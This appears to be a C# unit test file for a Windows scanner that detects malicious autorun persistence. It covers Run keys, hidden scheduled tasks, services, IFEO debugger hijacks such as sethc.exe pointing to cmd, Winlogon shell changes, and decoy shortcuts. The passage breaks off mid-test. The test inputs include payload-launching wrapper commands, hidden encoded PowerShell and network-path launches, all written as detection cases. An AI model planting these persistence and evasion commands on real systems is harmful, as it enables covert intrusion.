using System.Text;
using SafetySecurity.Core.Abstractions;
using SafetySecurity.Core.Model;
using SafetySecurity.Core.Parsing;
using SafetySecurity.Core.Rules;
using SafetySecurity.Core.Scanners;

namespace SafetySecurity.Core.Tests;

/// <summary>
/// cmd /c, start, conhost, explorer, forfiles, pcalua, PowerShell Start-Process로 감싼 명령이
/// 실제로 실행하는 파일까지 평가하는지 확인해요.
/// </summary>
public class WrappedCommandTests
{
    private const string Run = @"Software\Microsoft\Windows\CurrentVersion\Run";
    private const string Payload = @"C:\Users\Public\x.exe";
    private const string Cmd = @"C:\Windows\System32\cmd.exe";

    private static TestEnv Env()
    {
        var env = new TestEnv();
        foreach (var tool in new[]
        {
            Cmd, @"C:\Windows\System32\conhost.exe", @"C:\Windows\explorer.exe", @"C:\Windows\System32\forfiles.exe",
            @"C:\Windows\System32\pcalua.exe", @"C:\Windows\System32\wscript.exe", @"C:\Windows\System32\taskkill.exe",
            @"C:\Windows\System32\timeout.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\wbem\wmic.exe",
            @"C:\Windows\System32\rundll32.exe", @"C:\Windows\System32\shell32.dll", @"C:\Windows\System32\SecurityHealthSystray.exe",
        })
        {
            env.Files.Add(tool);
            env.Signatures.Signed(tool);
        }

        env.Files.Add(Payload);
        return env;
    }

    [Theory]
    [InlineData(@"cmd.exe /c start """" ""C:\Users\Public\x.exe""")]
    [InlineData(@"cmd.exe /c C:\Users\Public\x.exe")]
    [InlineData(@"cmd /c ""start /min """" C:\Users\Public\x.exe""")]
    [InlineData(@"cmd.exe /c timeout 5 & C:\Users\Public\x.exe")]
    [InlineData(@"cmd.exe /c timeout 5 && start /b C:\Users\Public\x.exe")]
    [InlineData(@"cmd.exe /q /d /c""C:\Users\Public\x.exe""")]
    [InlineData(@"cmd.exe /C C:\Users\Public\x^.exe")]
    [InlineData(@"%ComSpec% /c call C:\Users\Public\x.exe")]
    [InlineData(@"cmd.exe /c cmd.exe /c cmd.exe /c C:\Users\Public\x.exe")]
    [InlineData(@"powershell.exe Start-Process C:\Users\Public\x.exe")]
    [InlineData(@"powershell.exe -nop -c ""& 'C:\Users\Public\x.exe'""")]
    [InlineData(@"powershell.exe -c ""Start-Process -FilePath:$env:PUBLIC\x.exe""")]
    [InlineData(@"conhost.exe --headless C:\Users\Public\x.exe")]
    [InlineData(@"conhost.exe --width 80 --height 20 --headless cmd /c C:\Users\Public\x.exe")]
    [InlineData(@"explorer.exe C:\Users\Public\x.exe")]
    [InlineData(@"forfiles.exe /p C:\Windows /m explorer.exe /c ""cmd /c C:\Users\Public\x.exe""")]
    [InlineData(@"forfiles /p C:\Windows /m explorer.exe /c ""cmd /c 0x22C:\Users\Public\x.exe0x22""")]
    [InlineData(@"pcalua.exe -a C:\Users\Public\x.exe")]
    [InlineData(@"wmic.exe process call create ""C:\Users\Public\x.exe""")]
    public void WrappedPayloadInRunKeyIsHigh(string command)
    {
        var env = Env();
        env.Registry.Set(RegHive.CurrentUser, Run, "x", command);
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal("RUN-001", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Payload, f.Target);
        Assert.Contains(f.Evidence, e => e.Key == "실제로 실행되는 파일" && e.Value == Payload);
        Assert.Contains(f.Reasons, r => r.Contains("를 거쳐 실행: ", StringComparison.Ordinal));
    }

    [Fact]
    public void ScriptThroughCmdInUserFolderIsMedium()
    {
        var env = Env();
        const string bat = @"C:\Users\jiyul\AppData\Roaming\r.bat";
        env.Files.Add(bat);
        env.Registry.Set(RegHive.CurrentUser, Run, "r", $"cmd.exe /c {bat}");
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(Severity.Medium, f.Severity);
        Assert.Equal(bat, f.Target);
    }

    [Fact]
    public void EncodedPowerShellThroughCmdIsHigh()
    {
        // 예전에는 cmd /c powershell 문자열만 보고 '보통'이었어요. 이제 안쪽 PowerShell 명령까지 봐요.
        var env = Env();
        env.Registry.Set(RegHive.CurrentUser, Run, "p", "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA");
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(Severity.High, f.Severity);
        Assert.Contains(f.Reasons, r => r.Contains("EncodedCommand", StringComparison.Ordinal));
    }

    [Fact]
    public void ForcedScriptEngineRunsDisguisedFile()
    {
        var env = Env();
        const string log = @"C:\Users\jiyul\AppData\Roaming\x.log";
        env.Files.Add(log);
        env.Registry.Set(RegHive.CurrentUser, Run, "w", $"wscript.exe //B //E:jscript {log}");
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(Severity.Medium, f.Severity);
        Assert.Equal(log, f.Target);
        Assert.Contains(f.Reasons, r => r.Contains("//E:", StringComparison.Ordinal));
        Assert.Contains(f.Evidence, e => e.Key == "스크립트 위치");
    }

    [Fact]
    public void ForcedScriptEngineInTempIsHigh()
    {
        var env = Env();
        const string dat = @"C:\Users\jiyul\AppData\Local\Temp\a.dat";
        env.Files.Add(dat);
        env.Registry.Set(RegHive.CurrentUser, Run, "w", $"wscript.exe //E:vbscript {dat}");
        Assert.Equal(Severity.High, Assert.Single(new AutorunScanner().Scan(env.Context())).Severity);
    }

    [Theory]
    [InlineData(@"cmd /c start """" ""C:\Program Files (x86)\Steam\steam.exe"" -silent")]
    [InlineData(@"cmd.exe /c ""C:\Program Files (x86)\Steam\steam.exe""")]
    [InlineData(@"explorer.exe C:\Users\jiyul\Documents")]
    [InlineData(@"explorer.exe C:\Users\jiyul\Documents\notes.txt")]
    [InlineData(@"explorer.exe shell:startup")]
    [InlineData(@"cmd.exe /c taskkill /im game.exe")]
    [InlineData(@"cmd.exe /c echo hello > nul 2>&1")]
    [InlineData(@"cmd.exe /c set X=1 & exit")]
    [InlineData(@"powershell.exe -c Start-Process notepad.exe")]
    [InlineData(@"powershell.exe -c ""Copy-Item C:\Users\Public\missing.exe C:\Temp""")]
    [InlineData(@"wscript.exe //E:jscript ""C:\Program Files\Vendor\task.js""")]
    [InlineData(@"cmd.exe")]
    [InlineData(@"cmd.exe /c")]
    [InlineData(@"""C:\Program Files (x86)\Steam\steam.exe"" -silent")]
    [InlineData(@"C:\Windows\System32\SecurityHealthSystray.exe")]
    [InlineData(@"""C:\Windows\System32\cmd.exe"" /c start """" /min ""C:\Program Files (x86)\Steam\steam.exe"" -silent")]
    [InlineData(@"cmd /c start /b """" ""C:\Program Files (x86)\Steam\steam.exe""")]
    [InlineData(@"C:\Windows\System32\cmd.exe /c ""C:\Program Files\Vendor\start.bat""")]
    [InlineData(@"powershell.exe -NoProfile -WindowStyle Normal -File ""C:\Program Files\Vendor\task.ps1""")]
    [InlineData(@"explorer.exe ""C:\Users\jiyul\Desktop\Projects""")]
    [InlineData(@"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL")]
    [InlineData(@"powershell.exe -NonInteractive -Command ""& 'C:\Program Files\Vendor\task.ps1' -Cache 'C:\ProgramData\Vendor\cache.dll'""")]
    public void BenignWrappersAreNotReported(string command)
    {
        var env = Env();
        const string steam = @"C:\Program Files (x86)\Steam\steam.exe";
        env.Files.Add(steam);
        env.Signatures.Signed(steam, "Valve Corp.");
        env.Files.Add(@"C:\Users\jiyul\Documents\notes.txt");
        env.Files.Add(@"C:\Program Files\Vendor\task.js");
        env.Files.Add(@"C:\Program Files\Vendor\start.bat");
        env.Files.Add(@"C:\Program Files\Vendor\task.ps1");
        env.Files.Add(@"C:\Users\jiyul\Desktop\Projects\readme.txt");
        env.Files.Add(@"C:\ProgramData\Vendor\cache.dll");
        env.Registry.Set(RegHive.CurrentUser, Run, "ok", command);
        Assert.Empty(new AutorunScanner().Scan(env.Context()));
    }

    [Fact]
    public void ScriptPayloadStaysTheTargetWhenArgumentsTie()
    {
        // -File 스크립트가 실제 페이로드예요. 인자로 넘긴 다른 프로그램 경로가 대상을 가로채면 안 돼요.
        var env = Env();
        const string script = @"C:\Program Files\Vendor\task.ps1";
        const string steam = @"C:\Program Files (x86)\Steam\steam.exe";
        env.Files.Add(script);
        env.Files.Add(steam);
        env.Signatures.Signed(steam, "Valve Corp.");
        env.Registry.Set(RegHive.CurrentUser, Run, "t", $"powershell.exe -WindowStyle Hidden -File \"{script}\" \"{steam}\"");
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(Severity.Medium, f.Severity);
        Assert.Equal(script, f.Target);
    }

    [Fact]
    public void WrappedSelfIsHidden_ButChainedPayloadIsNot()
    {
        var env = Env();
        const string self = @"C:\Program Files\SafetySecurity\SafetySecurity.exe";
        env.Files.Add(self);
        env.Registry.Set(RegHive.CurrentUser, Run, "self", $"cmd.exe /c \"\"{self}\" scan --quiet\"");
        env.Registry.Set(RegHive.CurrentUser, Run, "chain", $"cmd.exe /c \"{self}\" & {Payload}");
        var f = Assert.Single(new AutorunScanner().Scan(env.Context(self: [self])));
        Assert.EndsWith(@"\chain", f.Location, StringComparison.Ordinal);
        Assert.Equal(Payload, f.Target);
    }

    [Fact]
    public void DeepNestingStopsWithoutCrash()
    {
        var env = Env();
        var nested = string.Concat(Enumerable.Repeat("cmd /c ", 20)) + Payload;
        env.Registry.Set(RegHive.CurrentUser, Run, "deep", nested);
        _ = new AutorunScanner().Scan(env.Context()).ToList();
    }

    [Fact]
    public void ScheduledTaskThroughCmdIsReported()
    {
        const string xml = """
<Tasks>
<!-- \Updater -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Settings><Hidden>true</Hidden></Settings>
  <Actions Context="Author"><Exec><Command>cmd.exe</Command><Arguments>/c C:\Users\Public\x.exe</Arguments></Exec></Actions>
</Task>
</Tasks>
""";
        var env = Env();
        env.TasksXml = xml;
        var f = Assert.Single(new ScheduledTaskScanner().Scan(env.Context()));
        Assert.Equal("TASK-001", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Payload, f.Target);
        Assert.Contains(f.Reasons, r => r.Contains("숨김 작업", StringComparison.Ordinal));
    }

    [Fact]
    public void ServiceThroughCmdIsReported()
    {
        var env = Env();
        const string svc = @"SYSTEM\CurrentControlSet\Services\Evil";
        env.Registry.Set(RegHive.LocalMachine, svc, "Type", 0x10);
        env.Registry.Set(RegHive.LocalMachine, svc, "Start", 2);
        env.Registry.Set(RegHive.LocalMachine, svc, "ImagePath", $@"%ComSpec% /c start """" {Payload}");
        var f = Assert.Single(new ServiceScanner().Scan(env.Context()));
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Payload, f.Target);
    }

    [Fact]
    public void IfeoDebuggerThroughCmdStaysHigh_SignedToolIsMedium_CmdItselfIsHigh()
    {
        var env = Env();
        const string ifeo = @"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
        const string procexp = @"C:\Program Files\Sysinternals\procexp64.exe";
        env.Files.Add(procexp);
        env.Signatures.Signed(procexp, "Microsoft Corporation");
        env.Registry.Set(RegHive.LocalMachine, ifeo + @"\utilman.exe", "Debugger", $"cmd.exe /c {Payload}");
        env.Registry.Set(RegHive.LocalMachine, ifeo + @"\taskmgr.exe", "Debugger", $"\"{procexp}\"");
        env.Registry.Set(RegHive.LocalMachine, ifeo + @"\sethc.exe", "Debugger", Cmd);
        var findings = new AutorunScanner().Scan(env.Context()).ToDictionary(f => f.Title);
        Assert.Equal(Severity.High, findings["IFEO 디버거 설정: utilman.exe"].Severity);
        Assert.Equal(Payload, findings["IFEO 디버거 설정: utilman.exe"].Target);
        Assert.Equal(Severity.Medium, findings["IFEO 디버거 설정: taskmgr.exe"].Severity);
        Assert.Equal(Severity.High, findings["IFEO 디버거 설정: sethc.exe"].Severity);
        Assert.Contains(findings["IFEO 디버거 설정: sethc.exe"].Reasons, r => r.Contains("백도어", StringComparison.Ordinal));
    }

    [Fact]
    public void StartupShortcutToCmdWithPayloadIsHigh()
    {
        var env = Env();
        env.Files.Add(@"C:\Users\jiyul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Helper.lnk",
            new LnkFile { LinkInfoPath = Cmd, Arguments = $"/c start \"\" \"{Payload}\"" }.Build());
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal("RUN-002", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Payload, f.Target);
    }

    [Fact]
    public void NetworkPayloadInsideWrapperIsNotOpened()
    {
        var env = Env();
        var trap = new TrapFileSystem(env.Files);
        env.Registry.Set(RegHive.CurrentUser, Run, "n", @"cmd.exe /c start """" ""\\203.0.113.5\s\a.exe""");
        env.Registry.Set(RegHive.CurrentUser, Run, "p", @"powershell.exe -c ""Start-Process \\203.0.113.5\s\b.exe""");
        var findings = new AutorunScanner().Scan(env.Context(files: trap)).ToList();
        Assert.Equal(2, findings.Count);
        Assert.All(findings, f => Assert.Equal(Severity.High, f.Severity));
        Assert.Contains(findings, f => f.Target == @"\\203.0.113.5\s\a.exe");
        Assert.Contains(findings, f => f.Target == @"\\203.0.113.5\s\b.exe");
        Assert.Empty(trap.Touched);
    }

    /// <summary>네트워크 경로를 건드리면 기록하는 파일 시스템.</summary>
    private sealed class TrapFileSystem(IFileSystemView inner) : IFileSystemView
    {
        public List<string> Touched { get; } = [];

        private T Watch<T>(string path, T value)
        {
            if (path.StartsWith(@"\\", StringComparison.Ordinal))
            {
                Touched.Add(path);
            }

            return value;
        }

        public bool FileExists(string path) => Watch(path, inner.FileExists(path));

        public bool DirectoryExists(string path) => Watch(path, inner.DirectoryExists(path));

        public FileMeta? GetMeta(string path) => Watch(path, inner.GetMeta(path));

        public IReadOnlyList<string> GetFiles(string directory) => Watch(directory, inner.GetFiles(directory));

        public IReadOnlyList<string> GetDirectories(string directory) => Watch(directory, inner.GetDirectories(directory));

        public byte[]? ReadPrefix(string path, int maxBytes) => Watch(path, inner.ReadPrefix(path, maxBytes));

        public byte[]? ReadAll(string path, long maxBytes) => Watch(path, inner.ReadAll(path, maxBytes));

        public string? Sha256(string path, long maxBytes) => Watch(path, inner.Sha256(path, maxBytes));
    }
}

public class LauncherCommandTests
{
    private static ParsedCommand P(string raw) => CommandLine.Parse(raw, TestEnv.Paths, null)!;

    [Theory]
    [InlineData(@"cmd /c start """" ""C:\a b\x.exe"" -q", @"""C:\a b\x.exe"" -q")]
    [InlineData(@"cmd /c ""start /min """" C:\x.exe""", @"C:\x.exe")]
    [InlineData(@"cmd /c start /d C:\work /b x.exe", "x.exe")]
    [InlineData(@"cmd /c start ""title only""", null)]
    [InlineData(@"cmd /k C:\x.exe", @"C:\x.exe")]
    [InlineData(@"cmd /r C:\x.exe", @"C:\x.exe")]
    [InlineData(@"cmd /v:on /c C:\x.exe", @"C:\x.exe")]
    [InlineData(@"cmd /cC:\x.exe", @"C:\x.exe")]
    [InlineData(@"cmd /c @C:\x.exe", @"C:\x.exe")]
    [InlineData(@"cmd /c (C:\x.exe)", @"C:\x.exe")]
    [InlineData(@"cmd /c startup.exe", "startup.exe")]
    [InlineData(@"cmd C:\x.exe", null)]
    public void FirstInnerCommandOfCmd(string raw, string? expected)
    {
        var inner = LauncherCommands.InnerCommands(P(raw));
        Assert.Equal(expected, inner.Count > 0 ? inner[0] : null);
    }

    [Fact]
    public void SplitsChainedCommandsButNotRedirections()
    {
        Assert.Equal(["a.exe", "b.exe", "c.exe", "d.exe"], LauncherCommands.InnerCommands(P("cmd /c a.exe & b.exe && c.exe || d.exe")));
        Assert.Equal(["a.exe > nul 2>&1", "b.exe"], LauncherCommands.InnerCommands(P("cmd /c a.exe > nul 2>&1 & b.exe")));
        // cmd는 바깥 따옴표를 벗긴 뒤 &에서 나눠요. 경로에 &가 있으면 따옴표를 두 겹으로 써야 해요.
        Assert.Equal([@"C:\a", @"b\x.exe"], LauncherCommands.InnerCommands(P(@"cmd /c ""C:\a&b\x.exe""")));
        Assert.Equal([@"""C:\a&b\x.exe"""], LauncherCommands.InnerCommands(P(@"cmd /c """"C:\a&b\x.exe""""")));
        // 괄호도 cmd의 특수 문자라서 (x86) 경로는 따옴표가 벗겨져요 (cmd /? 의 따옴표 규칙).
        Assert.Equal([@"C:\Program Files (x86)\a.exe -x"], LauncherCommands.InnerCommands(P(@"cmd /c ""C:\Program Files (x86)\a.exe"" -x"), _ => true));
        Assert.Equal(["echo a&b"], LauncherCommands.InnerCommands(P("cmd /c echo a^&b")));
        Assert.Equal(["a.exe", "findstr x"], LauncherCommands.InnerCommands(P("cmd /c a.exe | findstr x")));
    }

    [Fact]
    public void KeepsQuotesAroundExistingExecutable()
    {
        // cmd 규칙: 따옴표가 두 개뿐이고 그 안이 실제 실행 파일이면 따옴표를 남겨요.
        var exists = new HashSet<string> { @"C:\Program Files\App\app.exe" };
        Assert.Equal([@"""C:\Program Files\App\app.exe"""], LauncherCommands.InnerCommands(P(@"cmd /c ""C:\Program Files\App\app.exe"""), exists.Contains));
        Assert.Equal([@"C:\Program Files\App\gone.exe"], LauncherCommands.InnerCommands(P(@"cmd /c ""C:\Program Files\App\gone.exe"""), exists.Contains));
        Assert.Equal([@"C:\Program Files\App\app.exe"], LauncherCommands.InnerCommands(P(@"cmd /s /c ""C:\Program Files\App\app.exe"""), exists.Contains));
    }

    [Fact]
    public void OtherLaunchers()
    {
        Assert.Equal([@"C:\x.exe -a"], LauncherCommands.InnerCommands(P(@"conhost.exe 0xffffffff --headless C:\x.exe -a")));
        Assert.Equal([@"""C:\x.exe"""], LauncherCommands.InnerCommands(P(@"pcalua.exe -a C:\x.exe -c arg")));
        Assert.Equal([@"cmd /c ""C:\x.exe"""], LauncherCommands.InnerCommands(P(@"forfiles /p C:\ /m *.txt /c ""cmd /c 0x22C:\x.exe0x22""")));
        Assert.Equal([@"C:\x.exe /q"], LauncherCommands.InnerCommands(P(@"wmic process call create ""C:\x.exe /q""")));
        Assert.Empty(LauncherCommands.InnerCommands(P(@"C:\Program Files\App\app.exe /c x")));
    }

    [Fact]
    public void ArgumentPaths()
    {
        Assert.Equal([@"C:\x.exe"], LauncherCommands.ArgumentPaths(P(@"explorer.exe /n, C:\x.exe"), TestEnv.Paths));
        Assert.Empty(LauncherCommands.ArgumentPaths(P(@"explorer.exe shell:startup"), TestEnv.Paths));
        Assert.Equal(
            [@"C:\a b\x.exe", @"C:\Users\Public\y.ps1", @"C:\Users\jiyul\AppData\Roaming\z.exe"],
            LauncherCommands.ArgumentPaths(P(@"powershell -c ""& 'C:\a b\x.exe'; . 'C:\Users\Public\y.ps1'; saps $env:APPDATA\z.exe"""), TestEnv.Paths));
    }
}

public class PowerShellSwitchTests
{
    [Theory]
    [InlineData("powershell.exe -nop -encodedcom SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -nop -EncodedComman SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -nop -encodedcommand SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -nop -e SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -nop -ec SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -nop \u2013enc SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -nop \u2014ec SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -nop \u2015e SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe /enc SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe \"-enc\" SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -EncodedCommand:SQBFAFgA", Severity.High)]
    [InlineData("pwsh.exe --encodedcommand SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -ex bypass -enc SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -ExecutionPolicy Bypass -Version 2 -enc SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -w -enc SQBFAFgA", Severity.High)]
    [InlineData("powershell.exe -nop \u2014w hidden -c whoami", Severity.Medium)]
    [InlineData("pwsh.exe -WindowStyle:Hidden -c x", Severity.Medium)]
    [InlineData("powershell.exe -wind 1 -c x", Severity.Medium)]
    [InlineData("powershell.exe -win h -c x", Severity.Medium)]
    [InlineData("powershell.exe -nop -c \"$x -bxor 5\"", Severity.High)]
    [InlineData("powershell.exe -nop -c \"$x \u2013bxor 5\"", Severity.High)]
    [InlineData("powershell.exe -WindowStyle Normal -c x", Severity.Info)]
    [InlineData("powershell.exe -wd C:\\work -c whoami", Severity.Info)]
    [InlineData("powershell.exe -ExecutionPolicy Bypass -File \"C:\\Program Files\\x\\a.ps1\" -e x", Severity.Info)]
    [InlineData("powershell.exe -c \"Get-Thing -e foo\"", Severity.Info)]
    [InlineData("powershell.exe Get-Thing -e foo", Severity.Info)]
    public void Switches(string cmd, Severity expected)
    {
        var p = CommandLine.Parse(cmd, TestEnv.Paths, null)!;
        Assert.Equal(expected, CommandLineHeuristics.Analyze(p, new PathClassifier(TestEnv.Paths)).Severity);
    }

    [Fact]
    public void RunValueWithEnDashIsHigh()
    {
        var env = new TestEnv();
        env.Files.Add(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");
        env.Signatures.Signed(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");
        env.Registry.Set(RegHive.CurrentUser, @"Software\Microsoft\Windows\CurrentVersion\Run", "u", "powershell.exe -nop \u2013enc SQBFAFgA");
        Assert.Equal(Severity.High, Assert.Single(new AutorunScanner().Scan(env.Context())).Severity);
    }
}

public class WinlogonShellTests
{
    private const string Winlogon = @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon";

    [Theory]
    [InlineData("explorer.exe")]
    [InlineData("explorer.exe,")]
    [InlineData("Explorer.EXE")]
    [InlineData(@"C:\Windows\explorer.exe")]
    [InlineData(@"""C:\Windows\explorer.exe""")]
    [InlineData(@"%SystemRoot%\explorer.exe")]
    [InlineData(@"%windir%\explorer.exe, ")]
    public void DefaultShellIsNotReported(string shell)
    {
        var env = new TestEnv();
        env.Registry.Set(RegHive.LocalMachine, Winlogon, "Shell", shell);
        Assert.Empty(new AutorunScanner().Scan(env.Context()));
    }

    [Theory]
    [InlineData(@"C:\ProgramData\explorer.exe")]
    [InlineData(@"C:\Users\Public\m.exe,C:\Windows\explorer.exe")]
    [InlineData(@"C:\Users\Public\m.exe C:\Windows\explorer.exe")]
    [InlineData(@"explorer.exe, C:\Users\Public\m.exe")]
    [InlineData(@"C:\Windows\System32\explorer.exe")]
    [InlineData("cmd.exe")]
    public void ChangedShellIsHigh(string shell)
    {
        var env = new TestEnv();
        env.Registry.Set(RegHive.LocalMachine, Winlogon, "Shell", shell);
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal("RUN-003", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
    }
}

public class ShortcutTargetTests
{
    private const string Startup = @"C:\Users\jiyul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
    private const string Notepad = @"C:\Windows\System32\notepad.exe";
    private const string Payload = @"C:\Users\Public\x.exe";

    private static TestEnv Env()
    {
        var env = new TestEnv();
        env.Files.Add(Notepad);
        env.Signatures.Signed(Notepad);
        env.Files.Add(Payload);
        return env;
    }

    [Theory]
    [InlineData(9)]
    [InlineData(8)]
    [InlineData(7)]
    [InlineData(3)]
    public void ParsesIdListFileSystemItems(int version)
    {
        var info = LnkParser.Parse(new LnkFile { IdList = [@"C:\", "Program Files", "My App", "app.exe"], ShortPrimaryNames = true, ExtensionVersion = (ushort)version }.Build())!;
        Assert.Equal(@"C:\Program Files\My App\app.exe", info.IdListPath);
        Assert.Equal(@"C:\Program Files\My App\app.exe", info.TargetPath);
        Assert.Null(info.LinkInfoPath);
    }

    [Fact]
    public void IdListWithShortNamesOnlyIsNotGuessed()
    {
        var info = LnkParser.Parse(new LnkFile { IdList = [@"C:\", "Program Files", "app.exe"], ShortPrimaryNames = true, ExtensionVersion = 0, LinkInfoPath = @"C:\Program Files\app.exe" }.Build())!;
        Assert.Null(info.IdListPath);
        Assert.Equal(@"C:\Program Files\app.exe", info.TargetPath);
    }

    [Fact]
    public void IdListWithoutExtensionBlockUsesPlainNames()
    {
        var info = LnkParser.Parse(new LnkFile { IdList = [@"C:\", "Tools", "run.exe"], ExtensionVersion = 0 }.Build())!;
        Assert.Equal(@"C:\Tools\run.exe", info.IdListPath);
    }

    [Fact]
    public void NonFileSystemIdListIsNull()
    {
        var info = LnkParser.Parse(new LnkFile { RawIdListItems = [[0x71, 0x00, 0x01, 0x02]] }.Build())!;
        Assert.Null(info.IdListPath);
        Assert.Null(info.TargetPath);
        Assert.Empty(info.Candidates);
    }

    [Fact]
    public void ParsesNetworkLinkInfoAndNetworkIdList()
    {
        var net = LnkParser.Parse(new LnkFile { NetworkShare = @"\\host\share", NetworkSuffix = @"tools\x.exe" }.Build())!;
        Assert.Equal(@"\\host\share\tools\x.exe", net.LinkInfoPath);
        var id = LnkParser.Parse(new LnkFile { IdList = [@"\\host\share", "x.exe"] }.Build())!;
        Assert.Equal(@"\\host\share\x.exe", id.IdListPath);
    }

    [Fact]
    public void EnvironmentBlockWinsOnlyWithHasExpString()
    {
        var withFlag = LnkParser.Parse(new LnkFile { LinkInfoPath = Notepad, EnvironmentTarget = @"%PUBLIC%\x.exe", HasExpString = true }.Build())!;
        Assert.Equal(@"%PUBLIC%\x.exe", withFlag.TargetPath);
        Assert.Equal([@"%PUBLIC%\x.exe", Notepad], withFlag.Candidates);

        var noFlag = LnkParser.Parse(new LnkFile { LinkInfoPath = Notepad, EnvironmentTarget = @"%PUBLIC%\x.exe" }.Build())!;
        Assert.Equal(Notepad, noFlag.TargetPath);
        Assert.Equal([Notepad], noFlag.Candidates);

        var only = LnkParser.Parse(new LnkFile { EnvironmentTarget = @"%windir%\system32\notepad.exe" }.Build())!;
        Assert.Equal(@"%windir%\system32\notepad.exe", only.TargetPath);
    }

    [Fact]
    public void TruncatedExtraDataKeepsTarget()
    {
        var bytes = new LnkFile { LinkInfoPath = Notepad, Arguments = "-x", EnvironmentTarget = @"C:\a.exe", HasExpString = true }.Build();
        var cut = bytes[..(bytes.Length - 400)];
        var info = LnkParser.Parse(cut)!;
        Assert.Equal(Notepad, info.TargetPath);
        Assert.Equal("-x", info.Arguments);
    }

    [Fact]
    public void EnvironmentBlockDecoyIsReported()
    {
        // 보이는 대상은 메모장인데 Windows는 환경 변수 블록의 x.exe를 실행해요.
        var env = Env();
        env.Files.Add(Startup + "Notes.lnk", new LnkFile { LinkInfoPath = Notepad, EnvironmentTarget = Payload, HasExpString = true }.Build());
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal("RUN-002", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Payload, f.Target);
        Assert.Contains(f.Reasons, r => r.Contains("표시되는 대상과 실제 실행 대상이 달라요", StringComparison.Ordinal));
        Assert.Contains(f.Evidence, e => e.Key == "LinkInfo 대상" && e.Value == Notepad);
    }

    [Fact]
    public void IdListDecoyIsReported()
    {
        var env = Env();
        env.Files.Add(Startup + "Notes.lnk", new LnkFile { IdList = [@"C:\", "Users", "Public", "x.exe"], LinkInfoPath = Notepad }.Build());
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Payload, f.Target);
        Assert.Contains(f.Reasons, r => r.Contains("표시되는 대상과 실제 실행 대상이 달라요", StringComparison.Ordinal));
    }

    [Fact]
    public void DecoyBetweenTwoSignedProgramsIsMedium()
    {
        var env = Env();
        const string calc = @"C:\Windows\System32\calc.exe";
        env.Files.Add(calc);
        env.Signatures.Signed(calc);
        env.Files.Add(Startup + "Notes.lnk", new LnkFile { IdList = [@"C:\", "Windows", "System32", "calc.exe"], LinkInfoPath = Notepad }.Build());
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(Severity.Medium, f.Severity);
    }

    [Fact]
    public void IdListOnlyShortcutIsAssessed()
    {
        var env = Env();
        env.Files.Add(Startup + "Update.lnk", new LnkFile { IdList = [@"C:\", "Users", "Public", "x.exe"], Arguments = "-q" }.Build());
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Payload, f.Target);
        Assert.DoesNotContain(f.Reasons, r => r.Contains("표시되는 대상", StringComparison.Ordinal));
    }

    [Fact]
    public void NetworkShortcutIsHighWithoutTouchingTheNetwork()
    {
        var env = Env();
        env.Files.Add(Startup + "Net.lnk", new LnkFile { NetworkShare = @"\\203.0.113.5\s", NetworkSuffix = "a.exe" }.Build());
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(@"\\203.0.113.5\s\a.exe", f.Target);
        Assert.DoesNotContain(f.Evidence, e => e.Key == "서명" || e.Key == "SHA-256");
    }

    [Fact]
    public void ConsistentShortcutsAreNotReported()
    {
        var env = Env();
        const string app = @"C:\Program Files (x86)\Vendor\app.exe";
        env.Files.Add(app);
        env.Signatures.Signed(app, "Vendor");
        // 같은 대상을 가리키는 IDList + LinkInfo + 환경 변수 블록
        env.Files.Add(Startup + "Same.lnk", new LnkFile { IdList = [@"C:\", "Windows", "System32", "notepad.exe"], LinkInfoPath = Notepad, EnvironmentTarget = @"%SystemRoot%\System32\notepad.exe", HasExpString = true }.Build());
        // 32비트 설치 프로그램이 남긴 %ProgramFiles%: 64비트로 펼치면 없는 경로지만, 다른 후보가 같은 프로그램이에요.
        env.Files.Add(Startup + "Vendor.lnk", new LnkFile { LinkInfoPath = app, EnvironmentTarget = @"%ProgramFiles%\Vendor\app.exe", HasExpString = true }.Build());
